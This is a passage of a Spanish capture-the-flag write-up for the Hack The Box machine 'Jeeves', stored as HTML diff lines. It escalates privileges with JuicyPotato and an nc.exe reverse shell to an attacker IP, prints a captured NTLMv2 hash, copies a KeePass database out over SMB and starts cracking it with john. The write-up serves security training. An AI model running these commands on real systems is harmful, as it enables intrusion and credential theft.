+&lt;p&gt;Así mismo, buscamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; en nuestra máquina y lo copiamos en nuestro directorio de trabajo:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ locate nc.exe
+/usr/share/sqlninja/apps/nc.exe
+❯ &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /usr/share/sqlninja/apps/nc.exe &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora transferimos los archivos a la máquina víctima mediate un recurso compartido y en un directorio en donde tengamos permisos: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\Temp&lt;/code&gt; y nos creamos el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privesc&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ impacket-smbserver smbFolder &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt;
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Incoming connection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.63,49679&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; AUTHENTICATE_MESSAGE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;JEEVES&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;ohsuke,JEEVES&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; User JEEVES&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;ohsuke authenticated successfully
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; kohsuke::JEEVES:aaaaaaaaaaaaaaaa:031bce5f76d7906c9b6a6dc84df5b549:010100000000000080430a58d8bed701ba69bc758a1c267f0000000001001000460048006f0056004e004a006100470003001000460048006f0056004e004a006100470002001000670068007a005700530041007a00530004001000670068007a005700530041007a0053000700080080430a58d8bed701060004000200000008003000300000000000000000000000003000009452c393bb1aa4a1dcf86e8b7bdc4e817dc77f66558d27ad6325a928dcbc47e70a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003400000000000000000000000000
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Connecting Share&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1:IPC&lt;span class=&quot;nv&quot;&gt;$)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Connecting Share&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2:smbFolder&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Disconnecting Share&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1:IPC&lt;span class=&quot;nv&quot;&gt;$)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Disconnecting Share&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2:smbFolder&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Closing down connection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.63,49679&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Remaining connections &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&amp;gt;mkdir Privesc
+
+
+    Directory: C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                                  
+d-----       10/11/2021   8:46 PM                Privesc                                                               
+
+
+PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&amp;gt;cd Privesc
+PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt;
+PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; copy &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.14.24&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;mbFolder&lt;span class=&quot;se&quot;&gt;\J&lt;/span&gt;uicyPotato.exe JP.exe
+PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; copy &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.14.24&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;mbFolder&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;c.exe nc.exe
+PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
+
+
+    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc
+
+
+Mode                LastWriteTime         Length Name                                                                  
+&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                                  
+&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;       10/11/2021   3:34 PM         347648 JP.exe                                                                
+&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;       10/11/2021   3:38 PM          28160 nc.exe                                                                
+
+
+PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora si ejecutamos nuestro archivo con el argumento &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a&lt;/code&gt; para que nos entable una reverse shell, por lo que nos ponemos en escucha por puerto 443:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&lt;span class=&quot;se&quot;&gt;\J&lt;/span&gt;P.exe
+JuicyPotato v0.1 
+
+Mandatory args: 
+&lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; createprocess call: &amp;lt;t&amp;gt; CreateProcessWithTokenW, &amp;lt;u&amp;gt; CreateProcessAsUser, &amp;lt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; try both
+&lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &amp;lt;program&amp;gt;: program to launch
+&lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &amp;lt;port&amp;gt;: COM server listen port
+
+
+Optional args: 
+&lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &amp;lt;ip&amp;gt;: COM server listen address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default 127.0.0.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &amp;lt;argument&amp;gt;: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;line argument to pass to program &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default NULL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &amp;lt;ip&amp;gt;: RPC server ip address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default 127.0.0.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &amp;lt;port&amp;gt;: RPC server listen port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default 135&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &amp;lt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;clsid&lt;span class=&quot;o&quot;&gt;}&amp;gt;&lt;/span&gt;: CLSID &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default BITS:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;4991d34b-80a1-4291-83b6-3328366b9097&lt;span class=&quot;o&quot;&gt;})&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; only &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;CLSID and print token&lt;span class=&quot;s1&quot;&gt;'s user
+PS C:\Windows\Temp\Privesc&amp;gt; 
+PS C:\Windows\Temp\Privesc&amp;gt; C:\Windows\Temp\Privesc\JP.exe -t * -p C:\Windows\System32\cmd.exe -l 4444 -a &quot;/c C:\Windows\Temp\Privesc\nc.exe -e cmd.exe 10.10.14.24 443&quot;
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444
+......
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+PS C:\Windows\Temp\Privesc&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.24] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.63] 49686
+Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.10586]
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2015 Microsoft Corporation. All rights reserved.
+
+&lt;span class=&quot;nb&quot;&gt;whoami
+whoami
+&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Otra forma de escalar privilegios sería buscando en el directorio del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kohsuke&lt;/code&gt; algun recurso que nos pueda servir y vemos que en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\kohsuke\Documents&amp;gt;&lt;/code&gt; existe un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CEH.kdbx&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;ohsuke&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
+
+
+    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;ohsuke&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments
+
+
+Mode                LastWriteTime         Length Name                                                                  
+&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                                  
+&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;        9/18/2017   1:43 PM           2846 CEH.kdbx                                                              
+
+
+PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;ohsuke&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si no sabemos que tipo de programa está asociado a la extensión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kdbx&lt;/code&gt;, podemos utilizar los &lt;a href=&quot;https://www.geeksforgeeks.org/working-with-magic-numbers-in-linux/&quot;&gt;&lt;strong&gt;&lt;em&gt;magic numbers&lt;/em&gt;&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;ohsuke&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; Format-Hex &lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt; CEH.kdbx | Select-Object &lt;span class=&quot;nt&quot;&gt;-First&lt;/span&gt; 1
+
+
+           Path: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;ohsuke&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;EH.kdbx
+
+           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
+
+00000000   03 D9 A2 9A 67 FB 4B B5 01 00 03 00 02 10 00 31  .???g?K?.......1
+
+
+PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;ohsuke&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si buscamos por los primeros 8 números en hexadecimal: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;03 D9 A2 9A&lt;/code&gt; en internet, vemos que nos arroja el uso de la herramienta &lt;a href=&quot;https://keepass.info/help/base/repair.html&quot;&gt;keepass&lt;/a&gt;. Asi que nos tratamos de pasar el archivo a nuestra máquina de atacante, por lo que nos compartimos un recurso a nivel de red:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ impacket-smbserver smbFolder &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt;
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Creamos una unidad lógica sincronizada con nuestro recurso compartido:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;ohsuke&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; New-PSDrive &lt;span class=&quot;nt&quot;&gt;-Name&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SharedFolder&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-PSProvider&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;FileSystem&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Root&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10.10.14.24&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;mbFolder&quot;&lt;/span&gt;
+
+Name           Used &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;     Free &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Provider      Root                                               CurrentLocation
+&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;           &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                               &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;
+SharedF...                             FileSystem    &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.14.24&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;mbFolder                                           
+
+
+PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;ohsuke&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y ahora nos copiamos el archivo a nuestra máquina de atacante:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;ohsuke&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; copy CEH.kdbx SharedFolder:&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;EH.kdbx
+PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;ohsuke&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ file CEH.kdbx
+CEH.kdbx: Keepass password database 2.x KDBX
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora debemos de descargarnos la utilidad que nos ayude a abrir el archivo, así que buscamos &lt;strong&gt;keepass&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ apt search keepass
+Ordenando... Hecho
+Buscar en todo el texto... Hecho
+gnome-passwordsafe/rolling 5.0-2 all
+  Password manager &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNOME
+
+keepass2/rolling 2.47+dfsg-2 all
+  Password manager
+
+keepass2-doc/rolling 2.47+dfsg-2 all
+  Password manager - Documentation
+
+keepass2-plugin-keepasshttp/rolling 1.8.4.2+dfsg1-2.1 all
+  KeePass2 plugin to expose password entries securely over HTTP
+
+keepassx/rolling 2.0.3+git20190121.1682ab9-2.2 amd64
+  Cross Platform Password Manager
+
+keepassxc/rolling 2.6.2+dfsg.1-1 amd64
+  Cross Platform Password Manager
+
+kpcli/rolling 3.1-3.1 all
+  &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;line interface to KeePassX password manager databases
+
+libfile-keepass-perl/rolling 2.03-1.1 all
+  interface to KeePass V1 and V2 database files
+
+python3-pykeepass/rolling 3.2.1-2 all
+  KeePass database library - Python 3.x Module
+
+webext-keepassxc-browser/rolling 1.7.4+repack1-2 all
+  Web browser extension to organize web site credentials &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;KeePassXC
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vamos a instalarnos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keepassxc&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ apt update
+❯ apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;keepassxc &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora si tratamos de abrir el archivo y vemos que nos solicita una contraseña&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jeeves/jeeves-keepass.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a utilizar fuerza bruta para tratar de romper la contraseña, asi que mediante la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keepass2john&lt;/code&gt; creamos el hash del archivo y posteriormente utilizamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; para romper la contraseña:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ keepass2john CEH.kdbx &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;
+❯ john &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt &lt;span class=&quot;nb&quot;&gt;hash
+&lt;/span&gt;Created directory: /root/.john
+Using default input encoding: UTF-8
